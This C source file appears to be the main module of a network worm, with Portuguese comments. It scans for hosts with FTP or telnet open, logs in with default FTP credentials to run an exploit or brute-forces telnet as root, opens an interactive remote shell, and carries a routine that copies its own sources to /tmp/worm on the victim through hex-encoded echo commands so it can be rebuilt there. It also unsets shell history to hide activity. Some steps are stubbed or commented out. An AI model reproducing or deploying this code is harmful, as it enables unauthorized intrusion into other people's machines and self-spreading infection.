#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <string.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netdb.h>

#include "exploit.h"
#include "recon.h"
#include "brutexor.h"
#include "telnet.h"

#define INIT_CMD "unset HISTFILE;id;uname -a;\n"
#define MAX_CMD_SIZE 512
#define FILE_UPLOAD_BLOCK_SIZE 48
#define FTP_USERNAME "ftp"
#define TELNET_USERNAME "root"
#define FTP_PASSWORD "ftp"

#define MAX(x, y) (((x) > (y)) ? (x) : (y))
#define MIN(x, y) (((x) < (y)) ? (x) : (y))

void scan_callback(uint32_t addr, int ftp_open, int telnet_open);
int run_ftp_exploit(uint32_t addr);
int run_telnet_bruteforce(uint32_t addr);
int propagate(int fd);
int upload_file(int fd, const char *filename, const char *dest);
int command(int fd, const char *str, ...);
int command_bg(int fd, const char *str, ...);
int shell(int fd);

int main(int argc, char *argv[]) {
    // ip_subnet *subnets;
    // int subnet_count;

    // subnet_count = getLocalSubnets(&subnets);
    // scanSubnets(subnets, subnet_count, &scan_callback);

    // FOR TESTING:
    scan_callback(inet_addr("10.2.0.100"), 0, 1);

    exit(EXIT_SUCCESS);
}

void scan_callback(uint32_t addr, int ftp_open, int telnet_open) {
    int fd;

    printf("# Found %s (ftp: %d, telnet: %d), attacking...\n",
        addrToString(addr), ftp_open, telnet_open);

    if (ftp_open && telnet_open) {
        if (rand() % 2)
            fd = run_ftp_exploit(addr);
        else
            fd = run_telnet_bruteforce(addr);
    }
    else if (ftp_open) {
        fd = run_ftp_exploit(addr);
    }
    else if (telnet_open) {
        fd = run_telnet_bruteforce(addr);
    }

    if (fd < 0) {
        fprintf(stderr, "Falha ao executar ataque.\n");
        return;
    }

    // printf("# Propagating worm...\n");
    // if (propagate(fd) != 0) {
    //     fprintf(stderr, "Falha ao propagar o worm.\n");
    //     return;
    // }

    shell(fd);

    close(fd);
}

int run_ftp_exploit(uint32_t addr) {
    int fd, ret;
    target_t *target = NULL;
    char *banner;

    fd = ftp_login(addrToString(addr), FTP_USERNAME, FTP_PASSWORD, &banner);
    if (fd <= 0) {
        fprintf(stderr, "Failed to connect (user/pass correct?)\n");
        return -1;
    }

    printf("# Banner: %s\n", (banner == NULL) ? "???" : banner);
    if (target == NULL) {
        target = target_from_banner(banner);
        if (target == NULL) {
            fprintf(stderr, "Failed to get target from banner, aborting...\n");
            return -1;
        }
    }
    printf ("# Target: %s\n", target->desc);

    ret = exploit(fd, target);
    if (ret != 0) {
        return -1;
    }

    return fd;
}

int run_telnet_bruteforce(uint32_t addr) {
    int fd = -1, ret;

    // fd = telnet_connect(addr);

    // if (fd <= 0) {
    //     return -1;
    // }

    // while (1) {
    //     pass = generate_pass();
    //     ret = telnet_login(fd, pass);

    //     if (ret)
    //         break;
    // }

    // if (!ret) {
    //     close(fd);
    //     return -1;
    // }

    return fd;
}

int propagate(int fd) {
    printf("# Cleaning up and preparing...\n");
    if (command(fd, "rm -rf /tmp/worm") != 0) {
        return -1;
    }
    if (command(fd, "mkdir -p /tmp/worm") != 0) {
        return -1;
    }
    if (command(fd, "cd /tmp/worm") != 0) {
        return -1;
    }

    printf("# Uploading files...\n");
    if (upload_file(fd, "main.c", "main.c") != 0) {
        return -1;
    }
    if (upload_file(fd, "recon.c", "recon.c") != 0) {
        return -1;
    }
    if (upload_file(fd, "recon.h", "recon.h") != 0) {
        return -1;
    }
    if (upload_file(fd, "exploit.c", "exploit.c") != 0) {
        return -1;
    }
    if (upload_file(fd, "exploit.h", "exploit.h") != 0) {
        return -1;
    }
    if (upload_file(fd, "brutextor.c", "brutextor.c") != 0) {
        return -1;
    }
    if (upload_file(fd, "brutextor.h", "brutextor.h") != 0) {
        return -1;
    }
    if (upload_file(fd, "Makefile", "Makefile") != 0) {
        return -1;
    }

    // printf("# Compiling...\n");
    // if (command(fd, "make") != 0) {
    //     return -1;
    // }

    // printf("# Executing...\n");
    // if (command_bg(fd, "./worm") != 0) {
    //     return -1;
    // }

    return 0;
}

int upload_file(int fd, const char *filename, const char *dest) {
    FILE *file;
    int size;
    unsigned char *file_buf;
    unsigned char hex_string[256];
    unsigned char hex[8];
    int i, offset;

    file = fopen(filename, "rb");

    if (file < 0) {
        fprintf(stderr, "Falha ao abrir arquivo '%s'.", filename);
        return -1;
    }

    // get the size of the file
    fseek(file, 0, SEEK_END);
    size = ftell(file);
    fseek(file, 0, SEEK_SET);

    // read the entire file into a buffer
    file_buf = (unsigned char*) malloc(size + 1);
    fread((void*) file_buf, size, 1, file);
    fclose(file);

    // clean the file at the remote host
    if (command(fd, "echo -n > %s", dest) != 0) {
        free(file_buf);
        return -1;
    }

    // push the file FILE_UPLOAD_BLOCK_SIZE bytes at a time
    for (i=0; i<size; i+=FILE_UPLOAD_BLOCK_SIZE) {
        // empty hex_string
        hex_string[0] = 0;

        // write hexadecimal bytes to hex_string
        for (offset=0; offset<MIN(FILE_UPLOAD_BLOCK_SIZE, size-i); offset++) {
            sprintf(hex, "\\x%02x", file_buf[i+offset]);
            strcat(hex_string, hex);
        }

        // execute a command to echo the hexadecimal bytes to the dest file
        if (command(fd, "echo -n -e '%s' >> %s", hex_string, dest) != 0) {
            free(file_buf);
            return -1;
        }
    }

    free(file_buf);
    return 0;
}

int command(int fd, const char *str, ...) {
    char buf[MAX_CMD_SIZE];
    char bufRead[MAX_CMD_SIZE];
    va_list vl;
    int len, ret;

    va_start(vl, str);
    vsnprintf(buf, sizeof(buf), str, vl);
    va_end(vl);

    // executa o comando enviando todo o log para /tmp/log
    // da maquina alvo e imprimindo na saída padrão o código
    // de saída
    dprintf(fd, "((%s) >>/tmp/log 2>&1); echo $?\n", buf);

    // lê o código de saída do socket
    len = read(fd, bufRead, sizeof(bufRead));
    bufRead[len] = '\0';
    ret = atoi(bufRead);

    return ret;
}

int command_bg(int fd, const char *str, ...) {
    char buf[MAX_CMD_SIZE];
    char bufRead[MAX_CMD_SIZE];
    va_list vl;
    int len;

    va_start(vl, str);
    vsnprintf(buf, sizeof(buf), str, vl);
    va_end(vl);

    // executa o comando em background, enviando todo o
    // log para /tmp/log da maquina alvo e imprimindo na
    // saída padrão um ok
    dprintf(fd, "((%s) >>/tmp/log 2>&1 &); echo ok\n", buf);

    // lê o "ok" pelo socket
    len = read(fd, bufRead, sizeof(bufRead));
    bufRead[len] = '\0';

    return (strcmp(bufRead, "ok\n") == 0) ? 0 : -1;
}

int shell(int fd) {
    char buf[MAX_CMD_SIZE];
    fd_set rfds;
    int len;

    // write(fd, INIT_CMD, strlen(INIT_CMD));

    while (1) {
        FD_SET(0, &rfds);
        FD_SET(fd, &rfds);

        select(fd + 1, &rfds, NULL, NULL, NULL);
        if (FD_ISSET(0, &rfds)) {
            len = read(0, buf, sizeof(buf));
            if (len == 0) {
                // EOF on stdin
                return 0;
            }
            else if (len < 0) {
                fprintf(stderr, "Error reading from standard input.\n");
                return -1;
            }
            write(fd, buf, len);
        }

        if (FD_ISSET(fd, &rfds)) {
            len = read(fd, buf, sizeof(buf));
            if (len == 0) {
                printf("Connection closed by foreign host.\n");
                return -1;
            }
            else if (len < 0) {
                fprintf(stderr, "Error reading from foreign host.\n");
                return -1;
            }
            write(1, buf, len);
        }
    }

    return 0;
}
